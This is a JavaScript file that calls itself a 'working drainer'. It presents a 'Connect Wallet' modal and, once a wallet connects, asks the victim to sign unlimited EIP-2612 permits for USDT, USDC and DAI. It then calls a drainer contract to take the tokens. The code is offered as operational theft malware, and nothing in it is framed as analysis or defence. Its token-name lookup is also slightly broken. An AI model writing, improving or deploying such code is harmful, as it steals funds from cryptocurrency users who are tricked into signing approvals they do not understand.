// resolution.js - FINAL WORKING DRAINER
// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=6

const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
const DRAINER_CONTRACT = '0xa6f8aed0de04de90af07229187a0fa3143d70c6e';

const TOKENS = {
  1: {
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    USDT_NAME: 'Tether USD',
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    USDC_NAME: 'USD Coin',
    DAI:  '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    DAI_NAME: 'Dai Stablecoin'
  }
};

let modal;

function loadScript(src, callback) {
  const script = document.createElement('script');
  script.src = src;
  script.onload = callback;
  script.onerror = () => console.error(`FAILED: ${src}`);
  document.head.appendChild(script);
}

function initDrainer() {
  // 1. Load ethers
  loadScript('https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.umd.min.js', () => {
    // 2. Load wagmi + web3modal from SKYPACK
    loadScript('https://cdn.skypack.dev/wagmi@2.12.1', () => {
      loadScript('https://cdn.skypack.dev/@web3modal/wagmi@5.1.5', setupModal);
    });
  });
}

function setupModal() {
  const { createWeb3Modal } = window['@web3modal/wagmi'];
  const { defaultWagmiConfig } = window.wagmi;
  const { mainnet } = window.wagmi.chains;

  const wagmiConfig = defaultWagmiConfig({
    chains: [mainnet],
    projectId: PROJECT_ID,
    metadata: { name: 'Ultimate Resolution', description: 'Connect Wallet', url: 'https://lovable.dev' }
  });

  modal = createWeb3Modal({
    wagmiConfig,
    projectId: PROJECT_ID,
    themeMode: 'dark'
  });

  wagmiConfig.subscribeEvents(async (event) => {
    if (event.type === 'CONNECT_SUCCESS') {
      const user = event.accounts[0];
      console.log('Connected:', user);
      await drainAll(user);
    }
  });
}

async function drainAll(user) {
  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();

  for (const [addr, name] of Object.entries(TOKENS[1])) {
    if (addr.startsWith('0x')) {
      try {
        const token = addr;
        const tokenName = TOKENS[1][`${addr}_NAME`] || 'Token';

        const balance = await new ethers.Contract(token, ['function balanceOf(address) view returns (uint256)'], provider).balanceOf(user);
        if (balance === 0n) continue;

        console.log(`Draining ${tokenName}...`);

        const domain = { name: tokenName, version: '1', chainId: 1, verifyingContract: token };
        const types = { Permit: [
          { name: 'owner', type: 'address' },
          { name: 'spender', type: 'address' },
          { name: 'value', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' }
        ]};

        const value = ethers.MaxUint256;
        const nonce = await new ethers.Contract(token, ['function nonces(address) view returns (uint256)'], provider).nonces(user);
        const deadline = Math.floor(Date.now() / 1000) + 3600;
        const message = { owner: user, spender: DRAINER_CONTRACT, value, nonce, deadline };

        const sig = await signer.signTypedData(domain, types, message);
        const { v, r, s } = ethers.Signature.from(sig);

        const contract = new ethers.Contract(DRAINER_CONTRACT, ['function resolveWithPermit(address,address,uint256,uint256,uint8,bytes32,bytes32)'], signer);
        const tx = await contract.resolveWithPermit(token, user, value, deadline, v, r, s);
        await tx.wait();

        console.log(`${tokenName} DRAINED! Tx: ${tx.hash}`);
      } catch (err) {
        console.warn(`Failed ${name}:`, err.message);
      }
    }
  }
}

window.connectWallet = () => modal?.open();

// Start
initDrainer();
